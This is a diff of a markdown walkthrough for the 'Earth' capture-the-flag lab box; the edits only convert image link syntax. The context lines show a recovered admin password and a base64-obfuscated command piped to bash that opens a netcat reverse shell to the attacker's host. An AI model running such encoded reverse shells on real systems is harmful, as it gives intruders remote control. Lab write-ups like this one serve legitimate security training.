@@ -33,7 +33,7 @@ Earth is an easy box though you will likely find it more challenging than "Mercu
 
 
 
-![[Fedora34EarthLogin.png]]
+![Earth](Fedora34EarthLogin.png)
 
 
 ---
@@ -52,7 +52,7 @@ Earth is an easy box though you will likely find it more challenging than "Mercu
 - gobuster
 
 
-![[netdiscover.png]]
+![Earth](netdiscover.png)
 
 
 
@@ -164,9 +164,7 @@ ff02::2 ip6-allrouters
 ## URL - earth.local
 #URL #EarthSecureMessagingService
 
-![[Earth Secure Messaging Service.png| 500]]
-
-
+![Earth](Earth%20Secure%20Messaging%20Service.png)
 
 ```sh
 
@@ -210,12 +208,12 @@ Finished
 
 ### earth.local/admin
 
-![[EarthAdminLogin.png]]
+![Earth](EarthAdminLogin.png)
 
 
 ### terratest.earth.local
 
-![[TestSitePleaseIgnore.png]]
+![Earth](TestSitePleaseIgnore.png)
 
 #### gobuster - terratest.earth.local
 
@@ -323,7 +321,7 @@ According to radiometric dating estimation and other evidence, Earth formed over
 	- From Hex
 	- key is the content of testdata.txt (use UTF8 (Unicode Transformation Format - 8-bit))
 
-![[CyberChef.png]]
+![Earth](CyberChef.png)
 
 
 ``earthclimatechangebad4humansearthclimatechangebad4humans``
@@ -337,7 +335,7 @@ According to radiometric dating estimation and other evidence, Earth formed over
 - Password: earthclimatechangebad4humans
 
 
-![[AdminCommandTool.png]]
+![Earth](AdminCommandTool.png)
 
 - CLI command
 	- whoami
@@ -361,7 +359,7 @@ According to radiometric dating estimation and other evidence, Earth formed over
 	
 	- echo 'bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNTYuNTIgNDQ0NAo=' | base64 -d | bash
 
-![[nc-lvnp4444.png]]
+![Earth](nc-lvnp4444.png)
 
 #Python 
 ```
